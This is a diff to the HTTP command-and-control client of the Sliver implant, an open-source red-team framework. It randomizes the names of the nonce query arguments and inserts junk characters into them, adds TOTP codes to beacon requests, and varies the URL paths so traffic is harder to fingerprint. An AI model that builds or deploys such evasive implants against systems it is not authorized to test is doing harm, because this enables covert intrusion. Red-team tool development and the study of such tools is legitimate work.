@@ -53,6 +53,8 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/pquerna/otp"
+	"github.com/pquerna/otp/totp"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -60,7 +62,12 @@ const (
 	defaultUserAgent  = "{{GenerateUserAgent}}"
 	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
+	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 )
+
+func init() {
+	insecureRand.Seed(time.Now().UnixNano())
+}
 
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string, pathPrefix string) (*SliverHTTPClient, error) {
@@ -119,23 +126,56 @@ func (s *SliverHTTPClient) SessionInit() error {
 	return nil
 }
 
-func (s *SliverHTTPClient) newHTTPRequest(method, uri string, encoderNonce int, body io.Reader) *http.Request {
-	req, _ := http.NewRequest(method, uri, body)
+func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
+	req, _ := http.NewRequest(method, uri.String(), body)
 	req.Header.Set("User-Agent", defaultUserAgent)
 	req.Header.Set("Accept-Language", "en-US")
-	query := req.URL.Query()
-	query.Set("_", fmt.Sprintf("%d", encoderNonce))
-	req.URL.RawQuery = query.Encode()
 	return req
+}
+
+func (s *SliverHTTPClient) nonceQueryArgument(uri *url.URL, value int) *url.URL {
+	values := uri.Query()
+	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	// {{if .Config.Debug}}
+	log.Printf("Encoder nonce %d", value)
+	// {{end}}
+	argValue := fmt.Sprintf("%d", value)
+	for i := 0; i < insecureRand.Intn(3); i++ {
+		index := insecureRand.Intn(len(argValue))
+		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		argValue = argValue[:index] + char + argValue[index:]
+	}
+	values.Add(string(key), argValue)
+	uri.RawQuery = values.Encode()
+	return uri
+}
+
+func (s *SliverHTTPClient) otpQueryArgument(uri *url.URL, value string) *url.URL {
+	values := uri.Query()
+	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	for i := 0; i < insecureRand.Intn(3); i++ {
+		index := insecureRand.Intn(len(value))
+		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		value = value[:index] + char + value[index+1:]
+	}
+	values.Add(string([]byte{key1, key2}), value)
+	uri.RawQuery = values.Encode()
+	return uri
 }
 
 func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	uri := s.txtURL()
+	nonce, encoder := encoders.RandomTxtEncoder()
+	s.nonceQueryArgument(uri, nonce)
+	otpCode := getOTPCode()
+	s.otpQueryArgument(uri, otpCode)
+
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	nonce, encoder := encoders.RandomEncoder()
-	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
+
+	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -180,22 +220,17 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 // We do our own POST here because the server doesn't have the
 // session key yet.
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
-
 	nonce, encoder := encoders.RandomEncoder()
-	// {{if .Config.Debug}}
-	log.Printf("[http] sessionInit = %v", sessionInit)
-	// {{end}}
 	payload := encoder.Encode(sessionInit)
-	// {{if .Config.Debug}}
-	log.Printf("[http] Encoded payload (%d) %v", nonce, payload)
-	// {{end}}
 	reqBody := bytes.NewReader(payload) // Already RSA encrypted
 
 	uri := s.pngURL()
-	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reqBody)
+	s.nonceQueryArgument(uri, nonce)
+	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
+
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		return err
@@ -227,7 +262,8 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	}
 	uri := s.jsURL()
 	nonce, encoder := encoders.RandomEncoder()
-	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
+	s.nonceQueryArgument(uri, nonce)
+	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
@@ -269,13 +305,16 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 	}
 	reqData, err := GCMEncrypt(*s.SessionKey, data)
 
-	nonce, encoder := encoders.RandomEncoder()
-	reader := bytes.NewReader(encoder.Encode(reqData))
 	uri := s.phpURL()
+	nonce, encoder := encoders.RandomEncoder()
+	s.nonceQueryArgument(uri, nonce)
+	reader := bytes.NewReader(encoder.Encode(reqData))
+
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
-	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reader)
+
+	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -299,7 +338,7 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	return strings.Join(segments, "/")
 }
 
-func (s *SliverHTTPClient) jsURL() string {
+func (s *SliverHTTPClient) jsURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
 	segments := []string{
@@ -314,10 +353,10 @@ func (s *SliverHTTPClient) jsURL() string {
 	}
 
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
-	return curl.String()
+	return curl
 }
 
-func (s *SliverHTTPClient) pngURL() string {
+func (s *SliverHTTPClient) pngURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
 	segments := []string{
@@ -332,10 +371,10 @@ func (s *SliverHTTPClient) pngURL() string {
 	}
 
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
-	return curl.String()
+	return curl
 }
 
-func (s *SliverHTTPClient) phpURL() string {
+func (s *SliverHTTPClient) phpURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{
 		// {{range .HTTPC2Config.PhpPaths}}
@@ -348,10 +387,10 @@ func (s *SliverHTTPClient) phpURL() string {
 		// {{end}}
 	}
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
-	return curl.String()
+	return curl
 }
 
-func (s *SliverHTTPClient) txtURL() string {
+func (s *SliverHTTPClient) txtURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{
 		// {{range .HTTPC2Config.TxtPaths}}
@@ -364,15 +403,18 @@ func (s *SliverHTTPClient) txtURL() string {
 		// {{end}}
 	}
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
-	return curl.String()
+	return curl
 }
 
+// Must return at least a file name, path segments are optional
 func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
-	n := insecureRand.Intn(2) // How many segments?
 	genSegments := []string{}
-	for index := 0; index < n; index++ {
-		seg := segments[insecureRand.Intn(len(segments))]
-		genSegments = append(genSegments, seg)
+	if 0 < len(segments) {
+		n := insecureRand.Intn(len(segments)) // How many segments?
+		for index := 0; index < n; index++ {
+			seg := segments[insecureRand.Intn(len(segments))]
+			genSegments = append(genSegments, seg)
+		}
 	}
 	filename := filenames[insecureRand.Intn(len(filenames))]
 	genSegments = append(genSegments, filename)
@@ -484,6 +526,21 @@ func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
 // restrictions such as in RFC 6265 (which we do not).
 func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
 	return jar.cookies
+}
+
+func getOTPCode() string {
+	now := time.Now().UTC()
+	opts := totp.ValidateOpts{
+		Digits:    8,
+		Algorithm: otp.AlgorithmSHA256,
+		Period:    uint(30),
+		Skew:      uint(1),
+	}
+	code, _ := totp.GenerateCodeCustom("{{ .OTPSecret }}", now, opts)
+	// {{if .Config.Debug}}
+	log.Printf("HTTP(S) TOTP Code: %s", code)
+	// {{end}}
+	return code
 }
 
 // {{end}} -HTTPc2Enabled
